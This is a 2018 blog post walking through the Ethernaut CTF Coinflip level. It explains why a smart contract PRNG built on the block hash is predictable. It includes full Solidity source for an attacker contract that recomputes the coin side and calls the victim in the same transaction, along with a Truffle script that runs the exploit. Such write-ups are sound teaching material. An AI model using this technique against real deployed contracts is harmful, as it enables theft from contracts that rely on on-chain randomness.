Title: Solving OpenZeppelin's Ethernaut CTF - Coinflip
Date: 2018-06-10
Tags: ethereum, solidity, ctf, smart contracts
Slug: coinflip-challenge-solution
Summary: Fourth post of a series in which we tackle the challenges in the [Ethernaut CTF by OpenZeppelin](https://ethernaut.openzeppelin.com/){:target="_blank",:rel="noopener"}. Through solving Coinflip, we learn how to exploit a common case of a poorly implemented PRNG in the Ethereum blockchain.

## Introduction
The [Coinflip challenge](https://ethernaut.openzeppelin.com/level/0xd340de695bbc39e72df800dfde78a20d2ed94035){:rel="noopener"} is an excellent example of how *not* to implement a Pseudo Random Number Generator (PRNG from now on) in the Ethereum blockchain. But hey, that is no easy task - sources of bullet-proof randomness (if those even actually exist) are pretty scarce in a deterministic environment such as the Ethereum blockchain.

Because of that, as of today, the most common way of securely flipping coins on the blockchain is to actually not do it on it. Instead, a common practice is to **trust** a third party who can flip the coins for us. Yeah, I know. Can we trust the third party ? Isn't **trustless** one of the core concepts of Ethereum (and other similar decentralized technologies) ? Bit of a trade-off there.

Anyway, we're not here to build a PRNG on the blockchain, but to break one (i.e. succesfuly predict the numbers that a PRNG will generate every time). Actually, as you will later understand, we don't even care about the exact number generated by the PRNG, since our objective is to just mimic the mechanism through which any number is generated.

My approach to tackle this challenge (all of them actually) was:

1. Understand the purpose of the contract
2. Study the contract's data flow (i.e the order in which functions are called, values set, etc.)
3. (Initially) discard operations that seem trivial and non-vulnerable (with a bit of common sense)
4. Put the focus on strange, not-so-common implementations of operations (function calls, weird usage data types, custom functions)
5. Thoroughly research (i.e google beyond page 1) best practices for the operations found in point 4. For instance, putting it simply, should I see that the contract is trying to generate a random number, I would go an investigate how random numbers are supposed to be generated. If the contract is doing it right, well, I learned something and just disregard that line of code. Otherwise, I may have found a potential vulnerable point with high chances of being the key to unlock the challenge.
6. Iterate. Always remember: it is a CTF challenge, it **MUST** have a solution, be patient, you just need to dig a bit deeper.

### The Coin Flip contract
Have you checked [CoinFlip's code](https://ethernaut.openzeppelin.com/level/0xd340de695bbc39e72df800dfde78a20d2ed94035){:rel="noopener"} yet ? Hope you have. Let's analyze it.

The constructor does nothing fancy, it just initializes the number of consecutive wins to 0. The public variable `consecutiveWins` is the one we will call at the end of our exploit to make sure we passed the challenge.

Then, the `flip` function. The vulnerabilty must be somewhere here. It takes a boolean value (each representing a *side* of the coin) and returns a boolean that says whether the caller won or not.

Looking at the function's code, it uses two global variables (`block.blockhash` and `block.number`) to obtain a new integer value `blockValue`. Then, by means of:
~~~solidity
if (lastHash == blockValue) {
    revert();
}

lastHash = blockValue;
~~~
the contract reverts the whole transaction if the previously obtained value `blockValue` is already known (i.e. it is the same as in the last flip). If it's not, then it saves that `blockValue` to remember it the next time. Why does it do that ? You'll find out soon enough, hold on.

Time to flip the coin now:
~~~solidity
uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
bool side = coinFlip == 1 ? true : false;
~~~
It takes the `blockValue`, and does an integer division with a constant number `FACTOR`. Maybe it's trying to further obfuscate the 'randomness' with a supposedly private kind of key, who knows. Finally, based on the result of the integer division, the contract decides the side of the coin and sets the `side` variable to `true` or `false`. If that `side` equals the caller's choice, then he/she scores a new victory. Otherwise, he/she has to start counting all over again.

### Cracking down the contract
Remember what I told you earlier. *The mechanism* through which the pseudo-random numbers are generated is all that matters now. There's no need to fully understand, at least for our purposes, why it does what it does or which numbers result from each one of the steps.

Now I'd need you to read the [docs on the available global vars in Solidity](http://solidity.readthedocs.io/en/v0.4.21/units-and-global-variables.html#block-and-transaction-properties){:rel="noopener"}. According to them, `block.blockhash` returns the hash of the given block, while `block.number` returns, no surprise, the current block number. From having analyzed the contract's code, it can be told that the PRNG **is using the hash and number of the current block as sources of randomness**. Even though the contract applies some weird operations over them afterwards, those operations are known to us - we can mimic them.

In other words, **we ought to find a way to know the hash and number of the block in which the transaction involving the flip function call is processed**. Were we to have that information *before* the flip function call is processed, it would be trivial for us to mimic the mechanisms implemented in the Flip Coin contract to guess the coin's side.

See how we have narrowed down the scope ?. I hope you have followed my train of thought up until here, since things are about to get trickier.

As you may know, in Ethereum, transactions are **always** originated and triggered by EOAs (externally owned accounts). Each transaction is processed by all nodes in the network, but only one of the nodes - the *lucky* one - gets to actually append a block containing the transaction to the blockchain. In the Ethereum blockchain, one block can contain several transactions. The number of transactions per block is restrained by a block's gas limit: the maximum amount of gas all transactions in the whole block combined are allowed to consume ([more details about gas limit here](https://bitcoin.stackexchange.com/questions/39132/what-is-gas-limit-in-ethereum){:rel="noopener"}). 

Given that one block can contain several transactions, these all share the same block number and block hash. Therefore, all coin flips executed in the same block would have the same outcome, right ? Yes, if only the contract's code did not include these lines of code:
~~~solidity
if (lastHash == blockValue) {
    revert();
}
~~~

From there, it follows that executing several transactions in the same block so they all share the block number and hash will sadly not help us solve the challenge. However, I previously said that all transactions are triggered by an EOA. Which means, contract's cannot trigger transactions - contracts only pass messages to each other, those messages being included **within the same transaction**. So what if we had something like a 'proxy' contract ? Couldn't we deploy a malicious contract that executes the attack for us? Stay with me here, we're almost there.

Imagine for a second that we deployed a new contract `CoinFlipAttack`. It its code, we could call `block.blockhash` and `block.number` just like `CoinFlip` contract does. In fact, we could mimic the whole PRNG implemented in `CoinFlip`, something like taking the coin from CoinFlip and flip it ourselves. Once we do that, we could predict the side of coin, and call the `CoinFlip` contract with our 'guess'. Since the call from `CoinFlipAttack` to `CoinFlip` is within the same transaction (originated in our first call to `CoinFlipAttack`), the block.blockhash and block.number values will be exactly the same as in the flip we did in `CoinFlipAttack`, thus our 'guess' will match the outcome in the `CoinFlip` contract. Do that 10 times in a row, and *voila'*, challenge solved.

### The exploit
Let's translate that last paragraph to Javascript and Solidity code. First, we need to create the `CoinFlipAttack` and deploy it to the network. I'm assuming that you already deployed the `CoinFlip` contract to your local blockchain (we covered the steps on how to do that in our first article).

In the contracts folder of the project, create a new file `CoinFlipAttack.sol`. Its code goes like this. Read the inline comments to fully get what I'm doing.
[The code of `CoinFlipAttack.sol` is also hosted in my Github repo](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/contracts/CoinFlipAttack.sol){:rel="noopener"}

~~~solidity
pragma solidity ^0.4.18;

/*
Import the vulnerable contract so we can later
instantiate it and call its functions
*/
import "./CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip public victimContract;
    
    // Same number as in CoinFlip contract
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    bool public side;
    
    /*
    Public function to set the victim contract. We will call this first in our exploit.
    It could have also been done in a constructor.
    */
    function setVictim(address _addr) public {
        /* 
        Note that here we are not calling CoinFlip constructor with an address,
        but just instantiating it and setting its address. All functions calls will be sent to that address.
        This is Solidity a quirk, get used to it :)
        */
        victimContract = CoinFlip(_addr);
    }

    /*
    Public function which mimics the PRNG in CoinFlip and then calls CoinFlip with the correct guess.
    */
    function flip() public returns (bool) {
        // Same PRNG as in victim contract
        // The "random" numbers will be exactly the same in both contracts
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        side = coinFlip == 1 ? true : false;

        // Here we call the victim contract flip function with our guess
        return victimContract.flip(side);
    }
}
~~~

In the `migrations/2_deploy_contracts.js` file include the necessary code to deploy both `CoinFlip` (if you haven't yet) and `CoinFlipAttack`, the run `npx truffle migrate`.
~~~javascript
let CoinFlip = artifacts.require('./CoinFlip.sol')
let CoinFlipAttack = artifacts.require('./CoinFlipAttack.sol')

module.exports = deployer => {
    deployer.deploy(CoinFlip)
    deployer.deploy(CoinFlipAttack)
}
~~~

Now create the exploit file, such as `exploits/coinflip.exploit.js`, and follow the structure of our previous exploits (check [Fallout]({filename}fallout.md) and [Fallback]({filename}fallback.md) posts for a refresh)

~~~javascript
const CoinFlipContract = artifacts.require('CoinFlip')
const CoinFlipAttackContract = artifacts.require('CoinFlipAttack')
const assert = require('assert')

async function execute(callback) {
    // Instance victim and attacker contract
    let victimContract = await CoinFlipContract.deployed()
    let attackerContract = await CoinFlipAttackContract.deployed()

    callback()
}
module.exports = execute
~~~

First, let's set the victim's address in the attacker contract:
~~~javascript
await attackerContract.setVictim(victimContract.address)
~~~

All set, flip the coin ten times by calling the flip function of our malicious attacker contract.
~~~javascript
for (let index = 0; index < 10; index++) {
    await attackerContract.flip()
}
~~~

That's it. Enjoy:
~~~javascript
// Check how many times we won
let wins = await victimContract.consecutiveWins.call()
assert.equal(wins.toNumber(), 10)
console.log(`Great! We won ${wins} times.`)

/* ... */
~~~

Challenge completed! I acknowledge the post could have been much shorter. In fact, the exploit code is only 38 lines including comments. However, I wanted to fully explain the reasoning and fundamentals behind the exploit code. As always, you can [check the full code of the Coin Flip exploit in my GitHub repo](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/exploits/coinflip.exploit.js){:rel="noopener"}.

Following the Ethernaut CTF problems, in the [next post]({filename}telephone.md) (shorter, I promise), we claim ownership of the [Telephone contract](https://ethernaut.openzeppelin.com/level/0x6b7b4a5260b67c1ee9196a42dd1ed8633231ba0a){:rel="noopener"}. Thanks for reading!.